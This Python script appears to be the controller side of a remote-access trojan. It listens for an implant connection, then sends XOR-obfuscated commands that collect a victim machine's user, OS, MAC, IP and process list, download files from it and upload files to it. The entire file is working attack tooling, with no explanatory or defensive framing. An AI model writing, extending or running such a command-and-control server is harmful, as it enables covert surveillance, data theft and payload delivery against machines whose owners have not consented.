import socket

ip = '192.168.159.129'
port = 12345

commands = ['exit', 'getUser', 'getOS', 'getMAC', 'getIP', 'getProc', 'download', 'upload']

# XOR encode data
def xor(data):
    xored_data = ""
    for c in data:
        xored_data += chr(ord(c) ^ 0x7A)
    xored_data += chr(0)
    return xored_data


def main():
    # Set up socket and listen for a connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    conn, addr = s.accept()

    while (1):
        # Get command and check if it is valid
        command = input("Enter command: ")
        if command not in commands:
            print("Invalid Command")
            continue

        # Close socket
        if command == "exit":
            s.close()
            break

        # Send command to the client
        conn.send(xor(command).encode())

        # Receive the file from client
        if command == "download":
            path = input("Enter path: ")
            data = conn.recv(100000)
            filedata = xor(data.decode())
            with open(path, 'w') as f:
                f.write(filedata)
            continue

        # Send file to the client
        if command == "upload":
            filename = input("Enter filename: ")
            with open(filename, 'rb') as f:
                content = f.read()
                conn.send(xor(content.decode()).encode())
            continue

        # Receive data from client
        data = conn.recv(20000)
        print(xor(data.decode()))


# Run the main server function
main()
